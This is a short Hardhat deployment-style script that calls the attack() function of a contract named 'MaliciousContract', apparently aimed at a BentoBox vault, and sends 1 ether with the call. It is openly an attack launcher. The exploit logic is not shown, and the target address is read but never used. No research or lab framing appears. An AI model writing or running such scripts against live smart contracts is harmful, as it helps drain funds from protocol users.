require('dotenv').config();
const { ethers } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();
    console.log("Attacking with the account:", attacker.address);

    const maliciousContractAddress = process.env.MALICIOUS_CONTRACT_ADDRESS;
    const targetBentoBoxAddress = process.env.BENTOBOX_ADDRESS; 
    const tokenAddress = process.env.TOKEN_ADDRESS;

    if (!maliciousContractAddress || !targetBentoBoxAddress || !tokenAddress) {
        console.error("Error: MALICIOUS_CONTRACT_ADDRESS, BENTOBOX_ADDRESS or TOKEN_ADDRESS not defined in .env file.");
        process.exit(1);
    }

    const MaliciousContract = await ethers.getContractAt("MaliciousContract", maliciousContractAddress);
    const attackAmount = ethers.utils.parseEther("1.0"); // Example: attacking with 1 ether

    try {
        const tx = await MaliciousContract.attack(attackAmount, { value: attackAmount });


        await tx.wait();
        console.log("Attack executed successfully. Transaction Hash:", tx.hash);
    } catch (error) {
        console.error("Error executing attack:", error);
    }
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error("Error running the script:", error);
        process.exit(1);
    });
